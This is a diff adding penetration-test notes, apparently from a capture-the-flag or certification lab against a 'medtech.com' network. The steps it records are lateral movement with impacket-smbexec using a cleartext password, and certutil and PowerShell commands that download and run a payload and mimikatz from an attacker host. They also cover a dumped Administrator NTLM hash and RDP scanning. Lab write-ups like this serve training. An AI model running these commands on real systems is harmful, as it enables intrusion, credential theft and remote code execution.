@@ -199,3 +199,38 @@ SMB         172.16.237.13   445    PROD01           [+] medtech.com\joe:Flowers1
 SMB         172.16.237.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
 SMB         172.16.237.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
 ...
+
+# Lets try smbexec
+proxychains impacket-smbexec medtech/joe@172.16.237.11
+Password: Flowers1
+C:\Windows\system32>whoami
+nt authority\system
+C:\Windows\system32>hostname
+FILES02
+C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
+d4f2fb85fba3a05acade0d8de3266f43
+
+C:\Windows\system32> certutil.exe -urlcache -f http://192.168.45.206:8088/web02-cute.exe C:\Temp\cute.exe
+C:\Windows\system32>C:\Temp\cute.exe
+
+# Go to MSFConsole
+sessions 3
+meterpreter > shell
+C:\Temp> Powershell
+PS C:\TEMP> iwr -uri http://192.168.45.206:8088/Windows/mimikatz.exe -Outfile mimi.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+...
+         * Username : Administrator
+         * Domain   : FILES02
+         * NTLM     : f1014ac49bae005ee3ece5f47547d185
+...
+
+# Lets find which server we can RDP
+proxychains nmap -sT -Pn -p3389 -iL targets.txt
+...
+172.16.237.12:3389 OK
+172.16.237.82:3389 OK
+...
+
+
